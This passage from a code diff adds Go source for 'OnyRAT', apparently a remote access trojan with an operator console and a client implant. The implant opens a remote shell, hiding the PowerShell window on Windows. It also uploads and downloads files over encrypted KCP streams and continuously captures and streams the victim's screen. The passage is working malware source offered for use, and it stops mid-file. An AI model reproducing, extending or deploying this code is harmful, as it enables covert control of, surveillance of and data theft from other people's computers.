+	buf := bufPool.Get().([]byte)
+	defer bufPool.Put(buf)
+
+	addr := c.Sess.RemoteAddr().String()
+
+	n, err := s.ReceiveSerialized(stream, buf, 15*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to receive challenge from client: %s: %w", addr, err)
+	}
+	challenge := buf[:n]
+
+	hash := sha256.Sum256(challenge)
+	signature, err := rsa.SignPKCS1v15(nil, key, crypto.SHA256, hash[:]) // The random parameter is legacy and can be ignored according to docs
+	if err != nil {
+		return fmt.Errorf("failed to sign challenge from client: %s: %w", addr, err)
+	}
+
+	if err := s.SendSerialized(stream, signature, 15*time.Second); err != nil {
+		return fmt.Errorf("failed to send signed challenge to client: %s: %w", addr, err)
+	}
+
+	return nil
+}
+
+```
+
+client.go — pkg\commands\client.go
+```
+//go:build client
+// +build client
+
+package commands
+
+import (
+	"context"
+	"errors"
+	"fmt"
+
+	handlers "github.com/Onyz107/onyrat/internal/commands/client"
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/Onyz107/onyrat/pkg/network"
+)
+
+func (ch *CommandHandler) RunClient() {
+	inCtx, cancel := context.WithCancelCause(ch.Ctx)
+	ch.cancel = cancel
+	defer func() {
+		if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
+			ch.done <- fmt.Errorf("failed to run client: %w", err)
+		} else {
+			ch.done <- nil
+		}
+	}()
+	defer cancel(nil)
+
+	client, ok := ch.Communicator.(*network.KCPClient)
+	if !ok {
+		cancel(fmt.Errorf("invalid client"))
+		return
+	}
+
+	stream, err := client.Manager.OpenStream(commandStream, 0)
+	if err != nil {
+		cancel(fmt.Errorf("failed to open command stream: %w", err))
+		return
+	}
+	defer stream.Close()
+
+	buf := smallBufPool.Get().([]byte)
+	defer smallBufPool.Put(buf)
+
+	for {
+		select {
+
+		case <-inCtx.Done():
+			return
+
+		default:
+			logger.Log.Debug("Waiting for command")
+
+			n, err := client.ReceiveEncrypted(stream, buf, 0)
+			if err != nil {
+				cancel(fmt.Errorf("failed to receive command: %v", err))
+				continue
+			}
+
+			cmd := string(buf[:n])
+			logger.Log.Infof("received command: %s", cmd)
+
+			switch cmd {
+
+			case "shell":
+				if err := handlers.HandleShell(client); err != nil {
+					logger.Log.Error(err)
+				}
+
+			case "download":
+				if err := handlers.HandleDownload(client, stream, inCtx); err != nil {
+					logger.Log.Error(err)
+				}
+
+			case "upload":
+				if err := handlers.HandleUpload(client, stream, inCtx); err != nil {
+					logger.Log.Error(err)
+				}
+
+			case "ls":
+				if err := handlers.HandleList(client, stream); err != nil {
+					logger.Log.Error(err)
+				}
+
+			case "screenstream":
+				go func() {
+					if err := handlers.HandleScreenstream(client, inCtx); err != nil {
+						logger.Log.Error(err)
+					}
+				}()
+
+			default:
+				logger.Log.Warnf("unknown command: %s", cmd)
+
+			}
+
+		}
+	}
+}
+
+func (ch *CommandHandler) StartClient() {
+	if ch.done == nil {
+		ch.done = make(chan error, 1)
+	}
+	go ch.RunClient()
+}
+
+func (ch *CommandHandler) WaitClient() error {
+	if ch.done != nil {
+		return <-ch.done
+	}
+	return fmt.Errorf("client command handler not initialized")
+}
+
+func (ch *CommandHandler) StopClient() {
+	if ch.cancel != nil {
+		ch.cancel(fmt.Errorf("stopped by user"))
+	}
+	ch.cancel = nil
+}
+
+```
+
+common.go — pkg\commands\common.go
+```
+package commands
+
+import (
+	"context"
+	"sync"
+
+	"github.com/Onyz107/onyrat/pkg/network"
+)
+
+// The stream for commands being handled by our program
+const commandStream = "commandStream"
+
+type CommandHandler struct {
+	Communicator network.Communicator
+	Ctx          context.Context
+	cancel       context.CancelCauseFunc
+	done         chan error
+}
+
+// Small shared buffer pool
+var smallBufPool = sync.Pool{
+	New: func() any {
+		return make([]byte, 1024)
+	},
+}
+
+```
+
+server.go — pkg\commands\server.go
+```
+//go:build server
+// +build server
+
+package commands
+
+import (
+	"context"
+	"errors"
+	"fmt"
+	"os"
+
+	handlers "github.com/Onyz107/onyrat/internal/commands/server"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/abiosoft/ishell"
+)
+
+func (ch *CommandHandler) RunServer() {
+	inCtx, cancel := context.WithCancelCause(ch.Ctx)
+	ch.cancel = cancel
+	defer func() {
+		if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
+			ch.done <- fmt.Errorf("failed to run server: %w", err)
+		} else {
+			ch.done <- nil
+		}
+	}()
+	defer cancel(nil)
+
+	server, ok := ch.Communicator.(*network.KCPServer)
+	if !ok {
+		cancel(fmt.Errorf("invalid server"))
+		return
+	}
+
+	shell := ishell.New()
+	shell.Println("Welcome to OnyRAT 1.0\nType 'help' to see available commands.\n")
+
+	shell.Interrupt(func(c *ishell.Context, count int, input string) {
+		if count < 2 {
+			c.Println("Press Ctrl+C again to exit.")
+			c.Println("Please note that this will terminate any ongoing background processes immediately.\n")
+			c.Println("Type 'exit' to exit gracefully.\n")
+			return
+		}
+		os.Exit(1)
+	})
+
+	shell.SetPrompt(fmt.Sprintf("(\033[1mOnyRAT\033[0m@%s) # ", server.Listener.Addr().String()))
+
+	handlers.RegisterShellCommand(server, shell)
+	handlers.RegisterShowCommand(server, shell)
+	handlers.RegisterDisconnectCommand(server, shell)
+	handlers.RegisterListFilesCommand(server, shell)
+	handlers.RegisterDownloadCommand(server, shell, inCtx)
+	handlers.RegisterUploadCommand(server, shell, inCtx)
+	handlers.RegisterScreenStreamCommand(server, shell, inCtx)
+
+	shell.Start()
+	defer shell.Close()
+
+	go func() {
+		shell.Wait()
+		cancel(nil)
+	}()
+
+	<-inCtx.Done()
+}
+
+func (ch *CommandHandler) StartServer() {
+	if ch.done == nil {
+		ch.done = make(chan error, 1)
+	}
+	go ch.RunServer()
+}
+
+func (ch *CommandHandler) WaitServer() error {
+	if ch.done != nil {
+		return <-ch.done
+	}
+	return fmt.Errorf("server command handler not initialized")
+}
+
+func (ch *CommandHandler) StopServer() {
+	if ch.cancel != nil {
+		ch.cancel(fmt.Errorf("stopped by user"))
+	}
+	ch.cancel = nil // Make nil so we do not error if Stop is called again after being initilized for only once
+}
+
+```
+
+common.go — pkg\commands\remoteshell\common.go
+```
+package remoteshell
+
+// The stream for remote shell connections
+const shellStream = "shellStream"
+
+```
+
+receive.go — pkg\commands\remoteshell\receive.go
+```
+//go:build server
+// +build server
+
+package remoteshell
+
+import (
+	"fmt"
+	"io"
+	"os"
+	"sync"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/Onyz107/onyrat/pkg/network"
+)
+
+type crfFilter struct{ r io.Reader }
+
+// Filter for \r in case of fuckass windows trailing \r
+func (f *crfFilter) Read(p []byte) (int, error) {
+	n, err := f.r.Read(p)
+	if err != nil {
+		return 0, err
+	}
+
+	writeIdx := 0
+	for readIdx := range n {
+		if p[readIdx] != '\r' {
+			p[writeIdx] = p[readIdx]
+			writeIdx++
+		}
+	}
+
+	return writeIdx, nil
+}
+
+func ReceiveShell(s *network.KCPServer, c *network.KCPClient) error {
+	var wg sync.WaitGroup
+	var cAddr = c.Sess.RemoteAddr().String()
+
+	stream, err := c.Manager.AcceptStream(shellStream, 20*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to accept the shell stream for: %s: %w", cAddr, err)
+	}
+	defer stream.Close()
+
+	// Read from stdin and send to stream
+	w, err := s.NewStreamedEncryptedSender(stream, 0)
+	if err != nil {
+		return fmt.Errorf("failed to get streamed sender: %w", err)
+	}
+
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		io.Copy(w, &crfFilter{r: os.Stdin})
+		stream.Close()
+	}()
+
+	logger.Log.Infof("Connected to remote shell: %s", cAddr)
+
+	// Read from stream and write to stdout
+	r, err := s.NewStreamedEncryptedReceiver(stream, 0)
+	if err != nil {
+		return fmt.Errorf("failed to get streamed receiver: %w", err)
+	}
+
+	io.Copy(os.Stdout, r)
+
+	logger.Log.Infoln("\033[2K\rPress Enter to exit...") // To break the goroutine
+	wg.Wait()
+
+	logger.Log.Infof("Disconnected from remote shell: %s", cAddr)
+
+	return nil
+}
+
+```
+
+send.go — pkg\commands\remoteshell\send.go
+```
+//go:build client
+// +build client
+
+package remoteshell
+
+import (
+	"fmt"
+	"io"
+	"time"
+
+	"github.com/Onyz107/onyrat/pkg/network"
+)
+
+func SendShell(c *network.KCPClient) error {
+	stream, err := c.Manager.OpenStream(shellStream, 20*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to open the shell stream: %w", err)
+	}
+	defer stream.Close()
+
+	stdout, stdin, cmd, err := getHandles()
+	if err != nil {
+		return fmt.Errorf("failed to get terminal handles: %w", err)
+	}
+
+	// Read from stdout and send to stream
+	w, err := c.NewStreamedEncryptedSender(stream, 0)
+	if err != nil {
+		return fmt.Errorf("failed to get streamed sender: %w", err)
+	}
+
+	go io.Copy(w, stdout)
+
+	// Read from stream and write to stdin
+	r, err := c.NewStreamedEncryptedReceiver(stream, 0)
+	if err != nil {
+		return fmt.Errorf("failed to get streamed receiver: %w", err)
+	}
+
+	go func() {
+		io.Copy(stdin, r) // Read from stdin to stream, when stream is closed kill process
+		cmd.Process.Kill()
+	}()
+
+	if err := cmd.Wait(); err != nil {
+		return fmt.Errorf("command wait error: %w", err)
+	}
+
+	return nil
+}
+
+```
+
+send_all.go — pkg\commands\remoteshell\send_all.go
+```
+//go:build !windows && client
+// +build !windows,client
+
+package remoteshell
+
+import (
+	"fmt"
+	"io"
+	"os/exec"
+
+	"github.com/creack/pty"
+)
+
+func getHandles() (io.ReadCloser, io.WriteCloser, *exec.Cmd, error) {
+	cmd := exec.Command("bash")
+
+	r, err := pty.Start(cmd)
+	if err != nil {
+		r.Close()
+		return nil, nil, nil, fmt.Errorf("failed to start pty: %w", err)
+	}
+
+	return r, r, cmd, nil
+}
+
+```
+
+send_windows.go — pkg\commands\remoteshell\send_windows.go
+```
+//go:build windows && client
+// +build windows,client
+
+package remoteshell
+
+import (
+	"fmt"
+	"io"
+	"os/exec"
+	"syscall"
+)
+
+func getHandles() (io.ReadCloser, io.WriteCloser, *exec.Cmd, error) {
+	cmd := exec.Command("powershell")
+
+	// Hide shell
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow: true,
+	}
+
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		stdout.Close()
+		return nil, nil, nil, fmt.Errorf("failed to pipe STDOUT: %w", err)
+	}
+	cmd.Stderr = cmd.Stdout // merge stderr into stdout
+
+	stdin, err := cmd.StdinPipe()
+	if err != nil {
+		stdout.Close()
+		stdin.Close()
+		return nil, nil, nil, fmt.Errorf("failed to pipe STDIN: %w", err)
+	}
+
+	if err := cmd.Start(); err != nil {
+		stdout.Close()
+		stdin.Close()
+		return nil, nil, nil, fmt.Errorf("failed to start shell: %w", err)
+	}
+
+	return stdout, stdin, cmd, nil
+}
+
+```
+
+common.go — pkg\commands\transfer\common.go
+```
+package transfer
+
+import (
+	"crypto/sha256"
+	"io"
+	"os"
+	"sync"
+)
+
+// The stream for downloading/uploading files from/to the client
+const downloadStream = "downloadStream"
+
+// Small shared buffer pool
+var smallBufPool = sync.Pool{
+	New: func() any {
+		return make([]byte, 1024)
+	},
+}
+
+func getFileHash(f *os.File) ([]byte, error) {
+	if _, err := f.Seek(0, io.SeekStart); err != nil {
+		return nil, err
+	}
+
+	h := sha256.New()
+	if _, err := io.Copy(h, f); err != nil {
+		return nil, err
+	}
+
+	if _, err := f.Seek(0, io.SeekStart); err != nil {
+		return nil, err
+	}
+
+	return h.Sum(nil), nil
+}
+
+```
+
+download.go — pkg\commands\transfer\download.go
+```
+package transfer
+
+import (
+	"bytes"
+	"context"
+	"encoding/binary"
+	"errors"
+	"fmt"
+	"io"
+	"os"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/infobar"
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/Onyz107/onyrat/pkg/network"
+)
+
+func Download(comm network.Communicator, streamManager *network.StreamManager, targetPath string, ctx context.Context) error {
+	inCtx, cancel := context.WithCancelCause(ctx)
+	defer cancel(nil)
+
+	stream, err := streamManager.AcceptStream(downloadStream, 20*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to accept the download stream: %w", err)
+	}
+	defer stream.Close()
+
+	file, err := os.OpenFile(targetPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0600)
+	if err != nil {
+		return fmt.Errorf("failed to open file: %w", err)
+	}
+	defer file.Close()
+
+	// Receive the file's information (file size, file hash)
+	buf := smallBufPool.Get().([]byte)
+	defer smallBufPool.Put(buf)
+
+	n, err := comm.ReceiveEncrypted(stream, buf, 15*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to receive file's size: %w", err)
+	}
+
+	fileInfo := buf[:n]
+
+	fileSize := binary.BigEndian.Uint64(fileInfo[:8])
+	fileHash := fileInfo[8 : 8+32]
+	logger.Log.Debugf("File size: %d, file hash: %x", fileSize, fileHash)
+
+	// Open a stream and start receiving
+	r, err := comm.NewStreamedEncryptedReceiver(stream, 0)
+	if err != nil {
+		return fmt.Errorf("failed to open a receiving stream: %w", err)
+	}
+	defer r.Close()
+
+	start := time.Now()
+	var (
+		total    int64
+		speedMBs float64
+		pct      int
+	)
+
+	update := infobar.InfoStatus(fmt.Sprintf("Starting download of: %s", targetPath))
+
+	ticker := time.NewTicker(500 * time.Millisecond)
+	defer ticker.Stop()
+
+	go func() {
+		for {
+			select {
+
+			case <-ticker.C:
+				update(fmt.Sprintf("Downloading %s: %d%% (%.2f MB/s)", targetPath, pct, speedMBs))
+
+			case <-inCtx.Done():
+				return
+
+			}
+		}
+	}()
+
+	for total < int64(fileSize) {
+		select {
+
+		case <-inCtx.Done():
+			if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
+				return err
+			}
+
+		default:
+			n, err := io.CopyN(file, r, 32*1024) // 32KB is the default of io.Copy
+			total += n
+
+			elapsed := time.Since(start).Seconds()
+			speedMBs = float64(total) / (1024 * 1024) / elapsed
+			pct = int(float64(total) / float64(fileSize) * 100)
+
+			if err != nil && err != io.EOF {
+				cancel(fmt.Errorf("failed to download streamed file: %w", err))
+				continue
+			}
+
+			if err == io.EOF {
+				cancel(nil)
+			}
+		}
+	}
+
+	computedHash, err := getFileHash(file)
+	if err != nil {
+		return fmt.Errorf("failed to compute downloaded file's hash: %w", err)
+	}
+
+	if !bytes.Equal(fileHash, computedHash) {
+		return fmt.Errorf("file hashes are not the same: expected: %x: got: %x", fileHash, computedHash)
+	}
+
+	cancel(nil)
+	update(fmt.Sprintf("Download of %s is complete", targetPath))
+	time.Sleep(5 * time.Second)
+	update("")
+
+	return nil
+}
+
+```
+
+upload.go — pkg\commands\transfer\upload.go
+```
+package transfer
+
+import (
+	"context"
+	"encoding/binary"
+	"errors"
+	"fmt"
+	"io"
+	"os"
+	"path/filepath"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/infobar"
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/Onyz107/onyrat/pkg/network"
+)
+
+func Upload(comm network.Communicator, streamManager *network.StreamManager, fileName string, ctx context.Context) error {
+	inCtx, cancel := context.WithCancelCause(ctx)
+	defer cancel(nil)
+
+	stream, err := streamManager.OpenStream(downloadStream, 20*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to open download stream: %w", err)
+	}
+	defer stream.Close()
+
+	fileName = filepath.Clean(fileName)
+
+	// Get a handle to the file
+	file, err := os.OpenFile(string(fileName), os.O_RDONLY, 0600)
+	if err != nil {
+		return fmt.Errorf("failed to open target file: %w", err)
+	}
+	defer file.Close()
+
+	fileInfo, err := file.Stat()
+	if err != nil {
+		return fmt.Errorf("failed to get file size: %w", err)
+	}
+
+	// Send the file's information (file size, file hash)
+	informationBuf := smallBufPool.Get().([]byte)
+	defer smallBufPool.Put(informationBuf)
+
+	binary.BigEndian.PutUint64(informationBuf[:8], uint64(fileInfo.Size()))
+	computedHash, err := getFileHash(file)
+	if err != nil {
+		return fmt.Errorf("failed to compute file hash: %w", err)
+	}
+	copy(informationBuf[8:], computedHash)
+
+	fileSize := uint64(fileInfo.Size())
+	fileHash := computedHash
+
+	logger.Log.Debugf("File size: %d, file hash: %x", fileSize, fileHash)
+
+	if err := comm.SendEncrypted(stream, informationBuf[:32+8], 15*time.Second); err != nil {
+		return fmt.Errorf("failed to send file information: %w", err)
+	}
+
+	// Open a stream and start sending
+	w, err := comm.NewStreamedEncryptedSender(stream, 0)
+	if err != nil {
+		return fmt.Errorf("failed to open a sending stream: %w", err)
+	}
+	defer w.Close()
+
+	start := time.Now()
+	var (
+		total    int64
+		speedMBs float64
+		pct      int
+	)
+
+	update := infobar.InfoStatus(fmt.Sprintf("Starting upload of: %s", fileName))
+
+	ticker := time.NewTicker(500 * time.Millisecond)
+	defer ticker.Stop()
+
+	go func() {
+		for {
+			select {
+
+			case <-ticker.C:
+				update(fmt.Sprintf("Uploading %s: %d%% (%.2f MB/s)", fileName, pct, speedMBs))
+
+			case <-inCtx.Done():
+				return
+			}
+		}
+	}()
+
+	for total < int64(fileSize) {
+		select {
+
+		case <-inCtx.Done():
+			if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
+				return err
+			}
+
+		default:
+			n, err := io.CopyN(w, file, 32*1024) // 32KB is the default of io.Copy
+			total += n
+
+			elapsed := time.Since(start).Seconds()
+			speedMBs = float64(total) / (1024 * 1024) / elapsed
+			pct = int(float64(total) / float64(fileSize) * 100)
+
+			if err != nil && err != io.EOF {
+				cancel(fmt.Errorf("failed to upload streamed file: %w", err))
+				continue
+			}
+
+			if err == io.EOF {
+				cancel(nil)
+			}
+
+		}
+
+	}
+
+	cancel(nil)
+	update(fmt.Sprintf("Upload of %s is complete", fileName))
+	time.Sleep(5 * time.Second)
+	update("")
+
+	return nil
+}
+
+```
+
+common.go — pkg\commands\videostreaming\common.go
+```
+package videostreaming
+
+import (
+	"bytes"
+	_ "embed"
+	"sync"
+)
+
+// The stream for screen sharing
+const screenStream = "screenStream"
+
+//go:embed templates/videostream.min.html
+var html string
+
+var bufPool = sync.Pool{
+	New: func() any {
+		return make([]byte, 128*1024)
+	},
+}
+
+var lazyBufPool = sync.Pool{
+	New: func() any {
+		return make([]byte, 0, 128*1024)
+	},
+}
+
+var bytesPool = sync.Pool{
+	New: func() any {
+		return new(bytes.Buffer)
+	},
+}
+
+```
+
+screen_receive.go — pkg\commands\videostreaming\screen_receive.go
+```
+//go:build server
+// +build server
+
+package videostreaming
+
+import (
+	"context"
+	"errors"
+	"fmt"
+	"io"
+	"net"
+	"net/http"
+	"sync"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/infobar"
+	"github.com/Onyz107/onyrat/pkg/network"
+)
+
+var (
+	latestImage []byte
+	imgMutex    sync.RWMutex
+)
+
+func ScreenstreamReceive(s *network.KCPServer, c *network.KCPClient, ctx context.Context) error {
+	inCtx, cancel := context.WithCancelCause(ctx)
+	defer cancel(nil)
+
+	stream, err := c.Manager.AcceptStream(screenStream, 20*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to accept screen stream: %w", err)
+	}
+	defer stream.Close()
+
+	r, err := s.NewStreamedEncryptedReceiver(stream, 5*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to create encrypted receiver: %w", err)
+	}
+	defer r.Close()
+
+	setupHTMLServer(inCtx, cancel)
+
+	for {
+		select {
+
+		case <-inCtx.Done():
+			if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
+				return fmt.Errorf("failed to receive screen stream: %w", err)
+			}
+			return nil
+
+		default:
+			buf, err := readJPEGFromReader(r)
+			if err != nil {
+				cancel(fmt.Errorf("failed to read jpeg from stream: %w", err))
+				continue
+			}
+
+			imgMutex.Lock()
+			latestImage = buf
+			imgMutex.Unlock()
+		}
+	}
+}
+
+func readJPEGFromReader(r io.Reader) ([]byte, error) {
+	buf := bufPool.Get().([]byte)
+	defer bufPool.Put(buf)
+
+	result := lazyBufPool.Get().([]byte)
+	defer lazyBufPool.Put(result[:0])
+
+	var state int // 0=looking for SOI, 1=found SOI, 2=complete
+	var lastByte byte
+	var hasLastByte bool
+
+	for state < 2 {
+		n, err := r.Read(buf)
+		if n == 0 {
+			if err == io.EOF {
+				break
+			}
+			if err != nil {
+				return nil, err
+			}
+			continue
+		}
+
+		data := buf[:n]
+		start := 0
+
+		// Handle cross-chunk boundary
+		if hasLastByte {
+			if state == 0 && lastByte == 0xFF && data[0] == 0xD8 {
+				// Found SOI across boundary
+				state = 1
+				result = append(result, 0xFF, 0xD8)
+				start = 1
+			} else if state == 1 && lastByte == 0xFF && data[0] == 0xD9 {
+				// Found EOI across boundary
+				result = append(result, 0xFF, 0xD9)
+				return result, nil
+			} else if state == 1 {
+				result = append(result, lastByte)
+			}
+			hasLastByte = false
+		}
+
+		// Process the chunk
+		for i := start; i < len(data)-1; i++ {
+			if data[i] == 0xFF {
+				if state == 0 && data[i+1] == 0xD8 {
+					// Found SOI
+					state = 1
+					result = append(result, data[i:i+2]...)
+					i++ // Skip next byte as it's part of marker
+				} else if state == 1 && data[i+1] == 0xD9 {
+					// Found EOI
+					result = append(result, data[i:i+2]...)
+					return result, nil
+				} else if state == 1 {
+					result = append(result, data[i])
+				}
+			} else if state == 1 {
+				result = append(result, data[i])
+			}
+		}
+
+		// Handle last byte of chunk (might be part of marker)
+		if len(data) > start {
+			lastByte = data[len(data)-1]
+			hasLastByte = true
+		}
+
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			return nil, err
+		}
+	}
+
+	// Add final byte if we're in the middle of JPEG data
+	if hasLastByte && state == 1 {
+		result = append(result, lastByte)
+	}
+
+	if state == 0 {
+		return nil, fmt.Errorf("SOI marker not found")
+	}
+
+	return result, nil
+}
+
+func setupHTMLServer(ctx context.Context, cancel context.CancelCauseFunc) {
+	ln, err := net.Listen("tcp", "127.0.0.1:0") // pick any free port
+	if err != nil {
+		cancel(fmt.Errorf("failed to start local TCP server: %w", err))
+		return
+	}
+	listenAddr := ln.Addr().String()
+
+	mux := http.NewServeMux()
+
+	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/html")
+		fmt.Fprintf(w, "%s", html)
+	})
+
+	mux.HandleFunc("/image", func(w http.ResponseWriter, r *http.Request) {
+		imgMutex.RLock()
+		defer imgMutex.RUnlock()
+		if latestImage == nil {
+			http.Error(w, "No image yet", http.StatusNotFound)
+			return
+		}
+
+		w.Header().Set("Content-Type", "image/jpeg")
+		w.Write(latestImage)
+	})
+
+	srv := &http.Server{Handler: mux}
+
+	update := infobar.InfoStatus(fmt.Sprintf("Opened local HTTP server at http://%s/", listenAddr))
+
+	go func() {
+		ticker := time.NewTicker(time.Second)
+		for {
+			select {
+
+			case <-ticker.C:
+				update(fmt.Sprintf("Serving screen stream at http://%s/ Type \"help\" for information on how to stop", listenAddr))
+
+			case <-ctx.Done():
+				ticker.Stop()
+				return
+
+			}
+		}
+	}()
+
+	go func() {
+		if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
+			cancel(fmt.Errorf("failed to serve local HTTP server: %w", err))
+		}
+	}()
+
+	go func() {
+		<-ctx.Done()
+
+		shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 5*time.Second)
+		defer shutdownCancel()
+
+		if err := srv.Shutdown(shutdownCtx); err != nil {
+			cancel(fmt.Errorf("failed to shutdown local HTTP server: %w", err))
+			return
+		}
+
+		update(fmt.Sprintf("HTTP server on %s has been shut down.", listenAddr))
+		time.Sleep(5 * time.Second)
+		update("")
+	}()
+}
+
+```
+
+screen_send.go — pkg\commands\videostreaming\screen_send.go
+```
+//go:build client
+// +build client
+
+package videostreaming
+
+import (
+	"bytes"
+	"context"
+	"fmt"
+	"image"
+	"image/jpeg"
+	"io"
+	"runtime"
+	"sync"
+	"time"
+
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/kbinani/screenshot"
+)
+
+func ScreenstreamSend(c *network.KCPClient, ctx context.Context) error {
+	inCtx, cancel := context.WithCancelCause(ctx)
+	defer cancel(nil)
+
+	stream, err := c.Manager.OpenStream(screenStream, 20*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to open screen stream: %w", err)
+	}
+	defer stream.Close()
+
+	w, err := c.NewStreamedEncryptedSender(stream, 5*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to create encrypted sender: %w", err)
+	}
+	defer w.Close()
+
+	frameChan := takeScreenshots(inCtx, cancel)
+	encodedChan := encodeScreenshots(inCtx, cancel, frameChan)
+
+	for encoded := range encodedChan {
+		select {
+
+		case <-inCtx.Done():
+			if err := context.Cause(inCtx); err != nil && err != context.Canceled && err != context.DeadlineExceeded {
+				return fmt.Errorf("failed to send screen stream: %w", err)
+			}
+
+		default:
+			w.Write(encoded.Bytes())
+			bytesPool.Put(encoded)
+
+		}
+
+	}
+
+	if err := context.Cause(inCtx); err != nil && err != context.Canceled && err != context.DeadlineExceeded {
+		return fmt.Errorf("failed to send screen stream: %w", err)
+	}
+
+	return nil
+}
+
+func takeScreenshots(ctx context.Context, cancel context.CancelCauseFunc) <-chan image.Image {
+	bounds := screenshot.GetDisplayBounds(0)
+	frameChan := make(chan image.Image, 1)
+
+	go func() {
+		defer close(frameChan)
+
+		for {
+			select {
+
+			case <-ctx.Done():
+				return
+
+			default:
+				img, err := screenshot.CaptureRect(bounds)
+				if err != nil {
+					cancel(fmt.Errorf("failed to capture screen: %w", err))
+					return
+				}
+
+				select {
+
+				case frameChan <- img:
+
+				default:
+					// drop frame if queue is full
+
+				}
+
+			}
+		}
+	}()
+
+	return frameChan
+}
+
+func encodeScreenshots(ctx context.Context, cancel context.CancelCauseFunc, imgs <-chan image.Image) <-chan *bytes.Buffer {
+	var wg sync.WaitGroup
+
+	workers := runtime.NumCPU()
+	encodedImages := make(chan *bytes.Buffer, workers*2)
+
+	for range workers {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+
+			for img := range imgs {
+				select {
+
+				case <-ctx.Done():
+					return
+
+				default:
+					b := bytesPool.Get().(*bytes.Buffer)
+					b.Reset()
+
+					if err := writeEncodedJPEG(img, b); err != nil {
+						cancel(fmt.Errorf("failed to write encoded jpeg: %w", err))
+						bytesPool.Put(b)
+						return
+					}
+
+					select {
+
+					case encodedImages <- b:
+
+					default:
+						// drop if writer is full
+						bytesPool.Put(b)
+					}
+
+				}
+			}
+		}()
+	}
+
+	go func() {
+		wg.Wait()
+		close(encodedImages)
+	}()
+
+	return encodedImages
+}
+
+func writeEncodedJPEG(img image.Image, writer io.Writer) error {
+	err := jpeg.Encode(writer, img, &jpeg.Options{Quality: 10})
+	if err != nil {
+		return fmt.Errorf("failed to encode image: %w", err)
+	}
+
+	return nil
+}
+
+```
+
+client.go — pkg\network\client.go
+```
+package network
+
+import (
+	"context"
+	"fmt"
+	"io"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/crypto"
+	"github.com/xtaci/kcp-go/v5"
+	"github.com/xtaci/smux"
+)
+
+type KCPClient struct {
+	Sess       *kcp.UDPSession
+	LastSeen   time.Time
+	ID         int
+	Manager    *StreamManager
+	AESKey     []byte
+	Authorized bool
+	Ctx        context.Context
+	cancel     context.CancelCauseFunc
+	done       chan error
+}
+
+func NewClient(addr string, ctx context.Context) (*KCPClient, error) {
+	inCtx, cancel := context.WithCancelCause(ctx)
+
+	conn, err := kcp.DialWithOptions(addr, nil, 0, 0)
+	if err != nil {
+		cancel(fmt.Errorf("failed to connect to server: %w", err))
+		return nil, fmt.Errorf("failed to connect to server: %w", err)
+	}
+
+	// Performance optimizations
+	conn.SetWindowSize(512, 512)
+	conn.SetNoDelay(1, 40, 2, 1)
+
+	sess, err := smux.Client(conn, nil)
+	if err != nil {
+		conn.Close()
+		cancel(fmt.Errorf("failed to create a session: %w", err))
+		return nil, fmt.Errorf("failed to create a session: %w", err)
+	}
+
+	streamManager := NewStreamManager(sess)
+
+	client := &KCPClient{
+		Sess:    conn,
+		Manager: streamManager,
+		AESKey:  crypto.GenerateAESKey(256),
+		Ctx:     inCtx,
+		cancel:  cancel,
+	}
+
+	return client, nil
+}
+
+func (c *KCPClient) Disconnect() {
+	c.cancel(fmt.Errorf("disconnected by user"))
+}
+
+func (c *KCPClient) Close() error {
+	c.cancel(nil)
+	return c.Sess.Close()
+}
+
+func (c *KCPClient) Send(stream *smux.Stream, data []byte, timeout time.Duration) error {
+	select {
+
+	case <-c.Ctx.Done():
+		return fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))
+
+	default:
+		return send(stream, data, timeout)
+
+	}
+}
+
+func (c *KCPClient) NewStreamedSender(stream *smux.Stream, timeout time.Duration) (io.WriteCloser, error) {
+	select {
+
+	case <-c.Ctx.Done():
+		return nil, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))
+
+	default:
+		return newStreamedSender(stream, timeout), nil
+
+	}
+}
+
+func (c *KCPClient) SendSerialized(stream *smux.Stream, data []byte, timeout time.Duration) error {
+	select {
+
+	case <-c.Ctx.Done():
+		return fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))
+
+	default:
+		return sendSerialized(stream, data, timeout)
+
+	}
+}
+
+func (c *KCPClient) SendEncrypted(stream *smux.Stream, data []byte, timeout time.Duration) error {
+	select {
+
+	case <-c.Ctx.Done():
+		return fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))
+
+	default:
+		return sendEncrypted(stream, data, c.AESKey, timeout)
+
+	}
+}
+
+func (c *KCPClient) NewStreamedEncryptedSender(stream *smux.Stream, timeout time.Duration) (io.WriteCloser, error) {
+	select {
+
+	case <-c.Ctx.Done():
+		return nil, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))
+
+	default:
